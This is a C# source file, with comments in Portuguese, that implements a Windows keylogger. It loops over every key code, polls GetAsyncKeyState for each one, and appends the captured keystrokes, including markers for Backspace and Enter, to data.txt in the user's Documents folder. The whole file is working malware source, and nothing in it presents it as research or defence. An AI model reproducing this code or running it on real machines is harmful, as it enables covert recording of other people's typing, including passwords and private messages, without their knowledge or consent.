using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace vrtx_keys {
    class KeyBoardListener {
        //importando a dll responsável por identificar se "n" tecla está sendo pressionada ou não
        [DllImport("user32.dll")]
        public static extern short GetAsyncKeyState(int vKey);

        [DllImport("user32.dll")]
        public static extern bool GetKeyState(int vKey);


        //constante que indica que a tecla está pressioanada
        const int PRESSED = -32767;

        short i, keyState;  // contador, estado da tecla
        string path = @""; //caminho da onde será guardada as informações

        //funcao que sera responsavel por identificar qual tecla foi pressionada
        public void Listener() {
            string filepath = fileAccess(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments));

            while(true) {
                //pausa para que o programa tenha chance de rodar.
                Thread.Sleep(5);

                for(i = 8; i < 255; i++) {
                    keyState = GetAsyncKeyState(i);

                    if(keyState == PRESSED) {
                        Console.WriteLine(i);
                        writeChar(i, filepath);
                    }
                }
            }
        }

        private string fileAccess(string path) {
            if(!Directory.Exists(path)) {
                Directory.CreateDirectory(path);
            }

            string filepath = path + @"\data.txt";

            if(!File.Exists(filepath)) {
                using(StreamWriter sw = File.CreateText(filepath)) { }
            }

            return filepath;
        }

        private void writeChar(int keyPressed, string filepath) {
            using(StreamWriter sw = File.AppendText(filepath)) {
                switch(keyPressed) {
                    case 8: //Backspace
                        sw.Write("{BKSP}");
                        Console.Write("{BKSP}");
                        break;
                    case 9: //Tab
                        sw.Write("{TAB}");
                        Console.Write("{TAB}");
                        break;
                    case 10: //NL, new line = \n
                        sw.Write("{N}");
                        Console.Write("{N}");
                        break;
                    case 11: //Vertical tab = \v
                        sw.Write("{V}");
                        Console.Write("{V}");
                        break;
                    case 12: //New page = \f
                        sw.Write("{F}");
                        Console.Write("{F}");
                        break;
                    case 13: //Carriage return = Enter
                        sw.Write("{ENTER}");
                        Console.Write("{ENTER}");
                        break;
                    case 16:
                        break;
                    case 161:
                        break;
                    case 20:
                        break;

                    default:
                        if(GetKeyState(0x14) ^ GetKeyState(0x10)) {
                            sw.Write((char)keyPressed);
                            Console.Write((char)keyPressed);
                        }
                        else {
                            sw.Write(((char)keyPressed).ToString().ToLower());
                            Console.Write(((char)keyPressed).ToString().ToLower());
                        }
                    break;
                }
            }
        }
    }
}